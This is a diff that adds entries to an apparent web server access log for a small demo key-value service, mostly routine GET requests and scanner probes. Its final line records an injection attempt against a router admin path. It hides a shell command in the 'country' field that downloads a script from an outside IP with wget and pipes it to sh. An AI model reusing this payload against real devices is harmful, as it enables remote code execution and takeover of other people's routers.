@@ -17,3 +17,20 @@ INFO:     49.36.189.0:59419 - "GET /static/demo.css HTTP/1.1" 200 OK
 INFO:     49.36.189.0:59420 - "GET /static/demo.js HTTP/1.1" 200 OK
 INFO:     49.36.189.0:59430 - "GET /static/demo.js HTTP/1.1" 200 OK
 INFO:     49.36.189.0:59420 - "GET /get_servers HTTP/1.1" 200 OK
+localhost:9001 loper koker
+<Response [200]>
+INFO:     49.36.189.0:59435 - "GET /set/localhost%3A9001/loper/koker HTTP/1.1" 200 OK
+INFO:     49.36.189.0:59435 - "GET /get/localhost%3A8001/loper HTTP/1.1" 200 OK
+INFO:     49.36.189.0:59435 - "GET /get/localhost%3A7001/loper HTTP/1.1" 200 OK
+INFO:     46.19.138.234:56544 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.49:48762 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.49:48872 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.49:48884 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     167.94.146.49:48892 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     93.174.93.12:60000 - "GET / HTTP/1.0" 200 OK
+INFO:     43.128.110.17:51814 - "GET / HTTP/1.1" 200 OK
+INFO:     95.214.55.226:44142 - "GET / HTTP/1.1" 200 OK
+INFO:     193.34.212.75:58394 - "GET / HTTP/1.1" 200 OK
+INFO:     31.220.1.144:58198 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60) HTTP/1.1" 404 Not Found
